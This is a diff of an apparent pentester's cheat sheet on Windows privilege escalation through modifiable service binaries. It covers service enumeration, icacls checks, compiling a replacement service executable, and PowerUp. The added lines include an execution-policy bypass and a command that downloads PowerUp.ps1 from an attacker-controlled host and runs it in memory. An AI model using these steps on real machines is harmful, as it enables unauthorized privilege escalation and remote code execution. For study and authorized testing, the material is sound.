@@ -1,32 +1,57 @@
-#In order to substitute a modificable binary that is running as an active service (for example mysql), we must first mv the binary in order to replace it. Otherwise the overwrite operation will triger an error.
+#In order to substitute a modificable binary that is running as an active service (for example mysql), we must first mv the binary in order to replace it. Otherwise the overwrite operation will triger an error
 
+######################################################################
+#### icacls permissions mask ####
+
+# +Mask+++++++Permissions+
+#   F		       Full access
+#   M		       Modify access
+#   RX	       Read and execute access
+#   R		       Read-only access
+#   W		       Write-only access
+######################################################################
 -------------------------------
-PowerShell
+######### From PowerShell #########
 
-Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} <--- List running services.
+#List running services.
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 
-Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'} <--- Check service startmode.
+#Check service startmode.
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
 ------------------------------
-Batch
+######### From CMD #########
 
-icacls "<FILEPATH>" <--- Check file/directory permissions.
+#Check file/directory permissions.
+icacls "<FILEPATH>"
 
-whoami /priv - /group <--- Check privileges or membership groups.
+#Check privileges or membership groups.
+whoami /priv - /group
 
-Start/Restart/Stop-Service.
+#Start/Stop/Restart Services.
+Start-Service <SERVICE_NAME>
+Restart-Service <SERVICE_NAME>
+Stop-Service <SERVICE_NAME>
 
-shutdown /r /t 0 <--- Restart machine to trigger auto-mode services payloads.
+#Restart machine to trigger auto-mode services payloads.
+shutdown /r /t 0
 ------------------------------
-Bash
+######### From Kali #########
 
-x86_64-w64-mingw32-gcc <CODENAME>.c -o <DESTNAME>.exe <--- Compile C code to a service binary.
-
+#Compile C code to a service binary.
+x86_64-w64-mingw32-gcc <CODENAME>.c -o <DESTNAME>.exe
 ------------------------------
-PowerUp
+######### PowerUp #########
 
 powershell -ep bypass
-Import-Module .\PowerUp.ps1; . .\PowerUp.ps1 <-- Import correctly powerup module.
 
-Invoke-AllChecks <--- Displays all vulnerabilties founded.
+#Import correctly powerup module.
+Import-Module .\PowerUp.ps1; . .\PowerUp.ps1
 
-Get-ModifiableServiceFile <--- List bin paths of modifiables services files.
+#Load PowerUp.ps1 directly on memory.
+iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1')
+
+#Displays all vulnerabilties founded.
+Invoke-AllChecks
+
+#List bin paths of modifiables services files.
+Get-ModifiableServiceFile
